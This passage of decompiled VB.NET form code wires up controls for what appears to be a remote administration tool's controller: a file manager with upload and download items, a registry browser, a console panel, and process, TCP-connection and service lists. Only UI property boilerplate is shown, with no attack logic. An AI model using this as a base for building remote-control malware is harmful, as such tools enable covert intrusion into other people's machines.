				Return Me._UploadToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadToolStripMenuItem_Click
				If Me._UploadToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UploadToolStripMenuItem.Click, value2
				End If
				Me._UploadToolStripMenuItem = value
				If Me._UploadToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UploadToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012C RID: 300
		' (get) Token: 0x0600031F RID: 799 RVA: 0x0001F5C8 File Offset: 0x0001D7C8
		' (set) Token: 0x06000320 RID: 800 RVA: 0x0001F5E0 File Offset: 0x0001D7E0
		Friend Overridable Property NewEmptyFileToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewEmptyFileToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewEmptyFileToolStripMenuItem_Click
				If Me._NewEmptyFileToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._NewEmptyFileToolStripMenuItem.Click, value2
				End If
				Me._NewEmptyFileToolStripMenuItem = value
				If Me._NewEmptyFileToolStripMenuItem IsNot Nothing Then
					AddHandler Me._NewEmptyFileToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012D RID: 301
		' (get) Token: 0x06000321 RID: 801 RVA: 0x0001F638 File Offset: 0x0001D838
		' (set) Token: 0x06000322 RID: 802 RVA: 0x0001F650 File Offset: 0x0001D850
		Friend Overridable Property NewFolderToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._NewFolderToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.NewFolderToolStripMenuItem_Click
				If Me._NewFolderToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._NewFolderToolStripMenuItem.Click, value2
				End If
				Me._NewFolderToolStripMenuItem = value
				If Me._NewFolderToolStripMenuItem IsNot Nothing Then
					AddHandler Me._NewFolderToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012E RID: 302
		' (get) Token: 0x06000323 RID: 803 RVA: 0x0001F6A8 File Offset: 0x0001D8A8
		' (set) Token: 0x06000324 RID: 804 RVA: 0x0001F6C0 File Offset: 0x0001D8C0
		Friend Overridable Property OpenDownloadsToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._OpenDownloadsToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.OpenDownloadsToolStripMenuItem_Click
				If Me._OpenDownloadsToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._OpenDownloadsToolStripMenuItem.Click, value2
				End If
				Me._OpenDownloadsToolStripMenuItem = value
				If Me._OpenDownloadsToolStripMenuItem IsNot Nothing Then
					AddHandler Me._OpenDownloadsToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700012F RID: 303
		' (get) Token: 0x06000325 RID: 805 RVA: 0x0001F718 File Offset: 0x0001D918
		' (set) Token: 0x06000326 RID: 806 RVA: 0x0001F730 File Offset: 0x0001D930
		Friend Overridable Property RarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RarToolStripMenuItem_Click
				If Me._RarToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._RarToolStripMenuItem.Click, value2
				End If
				Me._RarToolStripMenuItem = value
				If Me._RarToolStripMenuItem IsNot Nothing Then
					AddHandler Me._RarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000130 RID: 304
		' (get) Token: 0x06000327 RID: 807 RVA: 0x0001F788 File Offset: 0x0001D988
		' (set) Token: 0x06000328 RID: 808 RVA: 0x0001F7A0 File Offset: 0x0001D9A0
		Friend Overridable Property UnRarToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UnRarToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UnRarToolStripMenuItem_Click
				If Me._UnRarToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UnRarToolStripMenuItem.Click, value2
				End If
				Me._UnRarToolStripMenuItem = value
				If Me._UnRarToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UnRarToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000131 RID: 305
		' (get) Token: 0x06000329 RID: 809 RVA: 0x0001F7F8 File Offset: 0x0001D9F8
		' (set) Token: 0x0600032A RID: 810 RVA: 0x0001F810 File Offset: 0x0001DA10
		Friend Overridable Property UploadFromLinkToolStripMenuItem As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._UploadFromLinkToolStripMenuItem
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.UploadFromLinkToolStripMenuItem_Click
				If Me._UploadFromLinkToolStripMenuItem IsNot Nothing Then
					RemoveHandler Me._UploadFromLinkToolStripMenuItem.Click, value2
				End If
				Me._UploadFromLinkToolStripMenuItem = value
				If Me._UploadFromLinkToolStripMenuItem IsNot Nothing Then
					AddHandler Me._UploadFromLinkToolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000132 RID: 306
		' (get) Token: 0x0600032B RID: 811 RVA: 0x0001F868 File Offset: 0x0001DA68
		' (set) Token: 0x0600032C RID: 812 RVA: 0x0000291B File Offset: 0x00000B1B
		Friend Overridable Property ContextMenuStrip4 As ContextMenuStrip
			<DebuggerNonUserCode()>
			Get
				Return Me._ContextMenuStrip4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ContextMenuStrip)
				Me._ContextMenuStrip4 = value
			End Set
		End Property

		' Token: 0x17000133 RID: 307
		' (get) Token: 0x0600032D RID: 813 RVA: 0x0001F880 File Offset: 0x0001DA80
		' (set) Token: 0x0600032E RID: 814 RVA: 0x0001F898 File Offset: 0x0001DA98
		Friend Overridable Property RefreshToolStripMenuItem3 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._RefreshToolStripMenuItem3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshToolStripMenuItem3_Click
				If Me._RefreshToolStripMenuItem3 IsNot Nothing Then
					RemoveHandler Me._RefreshToolStripMenuItem3.Click, value2
				End If
				Me._RefreshToolStripMenuItem3 = value
				If Me._RefreshToolStripMenuItem3 IsNot Nothing Then
					AddHandler Me._RefreshToolStripMenuItem3.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000134 RID: 308
		' (get) Token: 0x0600032F RID: 815 RVA: 0x0001F8F0 File Offset: 0x0001DAF0
		' (set) Token: 0x06000330 RID: 816 RVA: 0x00002924 File Offset: 0x00000B24
		Friend Overridable Property MG As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._MG
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._MG = value
			End Set
		End Property

		' Token: 0x17000135 RID: 309
		' (get) Token: 0x06000331 RID: 817 RVA: 0x0001F908 File Offset: 0x0001DB08
		' (set) Token: 0x06000332 RID: 818 RVA: 0x0001F920 File Offset: 0x0001DB20
		Friend Overridable Property ListView1 As ListView
			<DebuggerNonUserCode()>
			Get
				Return Me._ListView1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim value2 As EventHandler = AddressOf Me.ListView1_SelectedIndexChanged
				If Me._ListView1 IsNot Nothing Then
					RemoveHandler Me._ListView1.SelectedIndexChanged, value2
				End If
				Me._ListView1 = value
				If Me._ListView1 IsNot Nothing Then
					AddHandler Me._ListView1.SelectedIndexChanged, value2
				End If
			End Set
		End Property

		' Token: 0x17000136 RID: 310
		' (get) Token: 0x06000333 RID: 819 RVA: 0x0001F978 File Offset: 0x0001DB78
		' (set) Token: 0x06000334 RID: 820 RVA: 0x0000292D File Offset: 0x00000B2D
		Friend Overridable Property ColumnHeader1 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader1 = value
			End Set
		End Property

		' Token: 0x17000137 RID: 311
		' (get) Token: 0x06000335 RID: 821 RVA: 0x0001F990 File Offset: 0x0001DB90
		' (set) Token: 0x06000336 RID: 822 RVA: 0x00002936 File Offset: 0x00000B36
		Friend Overridable Property ColumnHeader2 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader2 = value
			End Set
		End Property

		' Token: 0x17000138 RID: 312
		' (get) Token: 0x06000337 RID: 823 RVA: 0x0001F9A8 File Offset: 0x0001DBA8
		' (set) Token: 0x06000338 RID: 824 RVA: 0x0000293F File Offset: 0x00000B3F
		Friend Overridable Property vmethod_148 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_148
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._vmethod_148 = value
			End Set
		End Property

		' Token: 0x17000139 RID: 313
		' (get) Token: 0x06000339 RID: 825 RVA: 0x0001F9C0 File Offset: 0x0001DBC0
		' (set) Token: 0x0600033A RID: 826 RVA: 0x00002948 File Offset: 0x00000B48
		Friend Overridable Property Timer1 As Timer
			<DebuggerNonUserCode()>
			Get
				Return Me._Timer1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Me._Timer1 = value
			End Set
		End Property

		' Token: 0x1700013A RID: 314
		' (get) Token: 0x0600033B RID: 827 RVA: 0x0001F9D8 File Offset: 0x0001DBD8
		' (set) Token: 0x0600033C RID: 828 RVA: 0x00002951 File Offset: 0x00000B51
		Friend Overridable Property FMM As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._FMM
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._FMM = value
			End Set
		End Property

		' Token: 0x1700013B RID: 315
		' (get) Token: 0x0600033D RID: 829 RVA: 0x0001F9F0 File Offset: 0x0001DBF0
		' (set) Token: 0x0600033E RID: 830 RVA: 0x0000295A File Offset: 0x00000B5A
		Friend Overridable Property TextBox1 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._TextBox1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Me._TextBox1 = value
			End Set
		End Property

		' Token: 0x1700013C RID: 316
		' (get) Token: 0x0600033F RID: 831 RVA: 0x0001FA08 File Offset: 0x0001DC08
		' (set) Token: 0x06000340 RID: 832 RVA: 0x0001FA20 File Offset: 0x0001DC20
		Friend Overridable Property L1 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L1_DoubleClick1
				If Me._L1 IsNot Nothing Then
					RemoveHandler Me._L1.DoubleClick, value2
				End If
				Me._L1 = value
				If Me._L1 IsNot Nothing Then
					AddHandler Me._L1.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x1700013D RID: 317
		' (get) Token: 0x06000341 RID: 833 RVA: 0x0001FA78 File Offset: 0x0001DC78
		' (set) Token: 0x06000342 RID: 834 RVA: 0x00002963 File Offset: 0x00000B63
		Friend Overridable Property ColumnHeader6 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader6
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader6 = value
			End Set
		End Property

		' Token: 0x1700013E RID: 318
		' (get) Token: 0x06000343 RID: 835 RVA: 0x0001FA90 File Offset: 0x0001DC90
		' (set) Token: 0x06000344 RID: 836 RVA: 0x0000296C File Offset: 0x00000B6C
		Friend Overridable Property ColumnHeader7 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader7
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader7 = value
			End Set
		End Property

		' Token: 0x1700013F RID: 319
		' (get) Token: 0x06000345 RID: 837 RVA: 0x0001FAA8 File Offset: 0x0001DCA8
		' (set) Token: 0x06000346 RID: 838 RVA: 0x00002975 File Offset: 0x00000B75
		Friend Overridable Property p As PictureBox
			<DebuggerNonUserCode()>
			Get
				Return Me._p
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As PictureBox)
				Me._p = value
			End Set
		End Property

		' Token: 0x17000140 RID: 320
		' (get) Token: 0x06000347 RID: 839 RVA: 0x0001FAC0 File Offset: 0x0001DCC0
		' (set) Token: 0x06000348 RID: 840 RVA: 0x0001FAD8 File Offset: 0x0001DCD8
		Friend Overridable Property L2 As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._L2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.L2_SelectedIndexChanged
				Dim value3 As EventHandler = AddressOf Me.L2_DoubleClick
				If Me._L2 IsNot Nothing Then
					RemoveHandler Me._L2.SelectedIndexChanged, value2
					RemoveHandler Me._L2.DoubleClick, value3
				End If
				Me._L2 = value
				If Me._L2 IsNot Nothing Then
					AddHandler Me._L2.SelectedIndexChanged, value2
					AddHandler Me._L2.DoubleClick, value3
				End If
			End Set
		End Property

		' Token: 0x17000141 RID: 321
		' (get) Token: 0x06000349 RID: 841 RVA: 0x0001FB54 File Offset: 0x0001DD54
		' (set) Token: 0x0600034A RID: 842 RVA: 0x0000297E File Offset: 0x00000B7E
		Friend Overridable Property ColumnHeader8 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader8
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader8 = value
			End Set
		End Property

		' Token: 0x17000142 RID: 322
		' (get) Token: 0x0600034B RID: 843 RVA: 0x0001FB6C File Offset: 0x0001DD6C
		' (set) Token: 0x0600034C RID: 844 RVA: 0x00002987 File Offset: 0x00000B87
		Friend Overridable Property ColumnHeader9 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader9
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader9 = value
			End Set
		End Property

		' Token: 0x17000143 RID: 323
		' (get) Token: 0x0600034D RID: 845 RVA: 0x0001FB84 File Offset: 0x0001DD84
		' (set) Token: 0x0600034E RID: 846 RVA: 0x00002990 File Offset: 0x00000B90
		Friend Overridable Property ColumnHeader10 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader10
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader10 = value
			End Set
		End Property

		' Token: 0x17000144 RID: 324
		' (get) Token: 0x0600034F RID: 847 RVA: 0x0001FB9C File Offset: 0x0001DD9C
		' (set) Token: 0x06000350 RID: 848 RVA: 0x00002999 File Offset: 0x00000B99
		Friend Overridable Property LTCP As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LTCP
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LTCP = value
			End Set
		End Property

		' Token: 0x17000145 RID: 325
		' (get) Token: 0x06000351 RID: 849 RVA: 0x0001FBB4 File Offset: 0x0001DDB4
		' (set) Token: 0x06000352 RID: 850 RVA: 0x000029A2 File Offset: 0x00000BA2
		Friend Overridable Property ColumnHeader16 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader16
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader16 = value
			End Set
		End Property

		' Token: 0x17000146 RID: 326
		' (get) Token: 0x06000353 RID: 851 RVA: 0x0001FBCC File Offset: 0x0001DDCC
		' (set) Token: 0x06000354 RID: 852 RVA: 0x000029AB File Offset: 0x00000BAB
		Friend Overridable Property ColumnHeader17 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader17
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader17 = value
			End Set
		End Property

		' Token: 0x17000147 RID: 327
		' (get) Token: 0x06000355 RID: 853 RVA: 0x0001FBE4 File Offset: 0x0001DDE4
		' (set) Token: 0x06000356 RID: 854 RVA: 0x000029B4 File Offset: 0x00000BB4
		Friend Overridable Property ColumnHeader18 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader18
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader18 = value
			End Set
		End Property

		' Token: 0x17000148 RID: 328
		' (get) Token: 0x06000357 RID: 855 RVA: 0x0001FBFC File Offset: 0x0001DDFC
		' (set) Token: 0x06000358 RID: 856 RVA: 0x000029BD File Offset: 0x00000BBD
		Friend Overridable Property ColumnHeader19 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader19
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader19 = value
			End Set
		End Property

		' Token: 0x17000149 RID: 329
		' (get) Token: 0x06000359 RID: 857 RVA: 0x0001FC14 File Offset: 0x0001DE14
		' (set) Token: 0x0600035A RID: 858 RVA: 0x000029C6 File Offset: 0x00000BC6
		Friend Overridable Property ColumnHeader20 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader20
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader20 = value
			End Set
		End Property

		' Token: 0x1700014A RID: 330
		' (get) Token: 0x0600035B RID: 859 RVA: 0x0001FC2C File Offset: 0x0001DE2C
		' (set) Token: 0x0600035C RID: 860 RVA: 0x000029CF File Offset: 0x00000BCF
		Friend Overridable Property ColumnHeader21 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader21
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader21 = value
			End Set
		End Property

		' Token: 0x1700014B RID: 331
		' (get) Token: 0x0600035D RID: 861 RVA: 0x0001FC44 File Offset: 0x0001DE44
		' (set) Token: 0x0600035E RID: 862 RVA: 0x000029D8 File Offset: 0x00000BD8
		Friend Overridable Property RG As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._RG
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Me._RG = value
			End Set
		End Property

		' Token: 0x1700014C RID: 332
		' (get) Token: 0x0600035F RID: 863 RVA: 0x0001FC5C File Offset: 0x0001DE5C
		' (set) Token: 0x06000360 RID: 864 RVA: 0x0001FC74 File Offset: 0x0001DE74
		Friend Overridable Property RGLIST As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._RGLIST
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Dim value2 As EventHandler = AddressOf Me.RGLIST_DoubleClick
				If Me._RGLIST IsNot Nothing Then
					RemoveHandler Me._RGLIST.DoubleClick, value2
				End If
				Me._RGLIST = value
				If Me._RGLIST IsNot Nothing Then
					AddHandler Me._RGLIST.DoubleClick, value2
				End If
			End Set
		End Property

		' Token: 0x1700014D RID: 333
		' (get) Token: 0x06000361 RID: 865 RVA: 0x0001FCCC File Offset: 0x0001DECC
		' (set) Token: 0x06000362 RID: 866 RVA: 0x000029E1 File Offset: 0x00000BE1
		Friend Overridable Property ColumnHeader3 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader3
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader3 = value
			End Set
		End Property

		' Token: 0x1700014E RID: 334
		' (get) Token: 0x06000363 RID: 867 RVA: 0x0001FCE4 File Offset: 0x0001DEE4
		' (set) Token: 0x06000364 RID: 868 RVA: 0x000029EA File Offset: 0x00000BEA
		Friend Overridable Property ColumnHeader4 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader4
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader4 = value
			End Set
		End Property

		' Token: 0x1700014F RID: 335
		' (get) Token: 0x06000365 RID: 869 RVA: 0x0001FCFC File Offset: 0x0001DEFC
		' (set) Token: 0x06000366 RID: 870 RVA: 0x000029F3 File Offset: 0x00000BF3
		Friend Overridable Property ColumnHeader5 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader5
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader5 = value
			End Set
		End Property

		' Token: 0x17000150 RID: 336
		' (get) Token: 0x06000367 RID: 871 RVA: 0x0001FD14 File Offset: 0x0001DF14
		' (set) Token: 0x06000368 RID: 872 RVA: 0x0001FD2C File Offset: 0x0001DF2C
		Friend Overridable Property RGk As TreeView
			<DebuggerNonUserCode()>
			Get
				Return Me._RGk
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TreeView)
				Dim value2 As TreeNodeMouseClickEventHandler = AddressOf Me.RGk_NodeMouseClick
				Dim value3 As TreeViewEventHandler = AddressOf Me.RGk_AfterSelect
				Dim value4 As TreeViewEventHandler = AddressOf Me.RGk_AfterExpand
				Dim value5 As TreeViewEventHandler = AddressOf Me.RGk_AfterCollapse
				If Me._RGk IsNot Nothing Then
					RemoveHandler Me._RGk.NodeMouseDoubleClick, value2
					RemoveHandler Me._RGk.AfterSelect, value3
					RemoveHandler Me._RGk.AfterExpand, value4
					RemoveHandler Me._RGk.AfterCollapse, value5
				End If
				Me._RGk = value
				If Me._RGk IsNot Nothing Then
					AddHandler Me._RGk.NodeMouseDoubleClick, value2
					AddHandler Me._RGk.AfterSelect, value3
					AddHandler Me._RGk.AfterExpand, value4
					AddHandler Me._RGk.AfterCollapse, value5
				End If
			End Set
		End Property

		' Token: 0x17000151 RID: 337
		' (get) Token: 0x06000369 RID: 873 RVA: 0x0001FDF4 File Offset: 0x0001DFF4
		' (set) Token: 0x0600036A RID: 874 RVA: 0x0001FE0C File Offset: 0x0001E00C
		Friend Overridable Property sh As Panel
			<DebuggerNonUserCode()>
			Get
				Return Me._sh
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Panel)
				Dim value2 As EventHandler = AddressOf Me.sh_Resize
				If Me._sh IsNot Nothing Then
					RemoveHandler Me._sh.Resize, value2
				End If
				Me._sh = value
				If Me._sh IsNot Nothing Then
					AddHandler Me._sh.Resize, value2
				End If
			End Set
		End Property

		' Token: 0x17000152 RID: 338
		' (get) Token: 0x0600036B RID: 875 RVA: 0x0001FE64 File Offset: 0x0001E064
		' (set) Token: 0x0600036C RID: 876 RVA: 0x000029FC File Offset: 0x00000BFC
		Friend Overridable Property T1 As RichTextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As RichTextBox)
				Me._T1 = value
			End Set
		End Property

		' Token: 0x17000153 RID: 339
		' (get) Token: 0x0600036D RID: 877 RVA: 0x0001FE7C File Offset: 0x0001E07C
		' (set) Token: 0x0600036E RID: 878 RVA: 0x0001FE94 File Offset: 0x0001E094
		Friend Overridable Property T2 As TextBox
			<DebuggerNonUserCode()>
			Get
				Return Me._T2
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As TextBox)
				Dim value2 As KeyEventHandler = AddressOf Me.T2_KeyDown
				If Me._T2 IsNot Nothing Then
					RemoveHandler Me._T2.KeyDown, value2
				End If
				Me._T2 = value
				If Me._T2 IsNot Nothing Then
					AddHandler Me._T2.KeyDown, value2
				End If
			End Set
		End Property

		' Token: 0x17000154 RID: 340
		' (get) Token: 0x0600036F RID: 879 RVA: 0x0001FEEC File Offset: 0x0001E0EC
		' (set) Token: 0x06000370 RID: 880 RVA: 0x00002A05 File Offset: 0x00000C05
		Friend Overridable Property LPR As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LPR
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LPR = value
			End Set
		End Property

		' Token: 0x17000155 RID: 341
		' (get) Token: 0x06000371 RID: 881 RVA: 0x0001FF04 File Offset: 0x0001E104
		' (set) Token: 0x06000372 RID: 882 RVA: 0x00002A0E File Offset: 0x00000C0E
		Friend Overridable Property ColumnHeader22 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader22
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader22 = value
			End Set
		End Property

		' Token: 0x17000156 RID: 342
		' (get) Token: 0x06000373 RID: 883 RVA: 0x0001FF1C File Offset: 0x0001E11C
		' (set) Token: 0x06000374 RID: 884 RVA: 0x00002A17 File Offset: 0x00000C17
		Friend Overridable Property ColumnHeader23 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader23
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader23 = value
			End Set
		End Property

		' Token: 0x17000157 RID: 343
		' (get) Token: 0x06000375 RID: 885 RVA: 0x0001FF34 File Offset: 0x0001E134
		' (set) Token: 0x06000376 RID: 886 RVA: 0x00002A20 File Offset: 0x00000C20
		Friend Overridable Property ColumnHeader24 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader24
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader24 = value
			End Set
		End Property

		' Token: 0x17000158 RID: 344
		' (get) Token: 0x06000377 RID: 887 RVA: 0x0001FF4C File Offset: 0x0001E14C
		' (set) Token: 0x06000378 RID: 888 RVA: 0x00002A29 File Offset: 0x00000C29
		Friend Overridable Property ColumnHeader25 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader25
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader25 = value
			End Set
		End Property

		' Token: 0x17000159 RID: 345
		' (get) Token: 0x06000379 RID: 889 RVA: 0x0001FF64 File Offset: 0x0001E164
		' (set) Token: 0x0600037A RID: 890 RVA: 0x00002A32 File Offset: 0x00000C32
		Friend Overridable Property ColumnHeader26 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader26 = value
			End Set
		End Property

		' Token: 0x1700015A RID: 346
		' (get) Token: 0x0600037B RID: 891 RVA: 0x0001FF7C File Offset: 0x0001E17C
		' (set) Token: 0x0600037C RID: 892 RVA: 0x00002A3B File Offset: 0x00000C3B
		Friend Overridable Property LSRV As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LSRV
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LSRV = value
			End Set
		End Property

		' Token: 0x1700015B RID: 347
